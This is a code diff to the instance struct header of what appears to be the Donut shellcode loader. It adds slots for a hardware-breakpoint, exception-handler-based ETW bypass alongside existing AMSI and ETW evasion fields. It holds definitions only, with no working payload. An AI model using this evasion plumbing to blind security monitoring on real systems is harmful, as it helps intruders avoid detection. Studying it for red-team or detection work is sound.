@@ -253,8 +253,8 @@ typedef struct _DONUT_INSTANCE {
     uint64_t    iv;                           // the 64-bit initial value for maru hash
 
     union {
-      uint64_t  hash[64];                     // holds up to 64 api hashes
-      void     *addr[64];                     // holds up to 64 api addresses
+      uint64_t  hash[80];                     // holds up to 80 api hashes
+      void     *addr[80];                     // holds up to 80 api addresses
       // include prototypes only if header included from loader.h
       #ifdef LOADER_H
       struct {
@@ -334,8 +334,15 @@ typedef struct _DONUT_INSTANCE {
         NtCreateSection_t                NtCreateSection;
         NtMapViewOfSection_t             NtMapViewOfSection;
         NtUnmapViewOfSection_t           NtUnmapViewOfSection;
-       // AddVectoredExceptionHandler_t    AddVectoredExceptionHandler;
-       // RemoveVectoredExceptionHandler_t RemoveVectoredExceptionHandler;
+
+        // thread/VEH helpers for the patchless ETW hardware breakpoint
+        SetThreadContext_t               SetThreadContext;
+        GetCurrentThreadId_t             GetCurrentThreadId;
+        GetThreadId_t                    GetThreadId;
+        SuspendThread_t                  SuspendThread;
+        ResumeThread_t                   ResumeThread;
+        RtlAddVectoredExceptionHandler_t    RtlAddVectoredExceptionHandler;
+        RtlRemoveVectoredExceptionHandler_t RtlRemoveVectoredExceptionHandler;
        // RtlFreeUnicodeString_t         RtlFreeUnicodeString;
        // RtlFreeString_t                RtlFreeString;
       };
@@ -367,10 +374,15 @@ typedef struct _DONUT_INSTANCE {
     char        amsiInit[16];                 // AmsiInitialize
     char        amsiScanBuf[16];              // AmsiScanBuffer
     char        amsiScanStr[16];              // AmsiScanString
-    char        etwEventWrite[16];            // EtwEventWrite
-    char        etwEventUnregister[20];       // EtwEventUnregister
+    char        etwEventWrite[16];            // EtwEventWrite (fallback)
+    char        etwTraceEvent[20];            // NtTraceEvent (preferred)
+    char        ntGetNextThread[20];          // NtGetNextThread (thread enumeration)
     char        etwRet64[2];                  // "ret" instruction for Etw
     char        etwRet32[4];                  // "ret 14h" instruction for Etw
+    uint64_t    etwVeh;                       // registered VEH handle
+    uint64_t    etwNtdll;                     // ntdll base used by the VEH bypass
+    uint64_t    etwNtGetNextThread;           // NtGetNextThread used for cleanup
+    int         etwThreads;                   // threads currently armed
     
     char        wscript[8];                   // WScript
     char        wscript_exe[12];              // wscript.exe
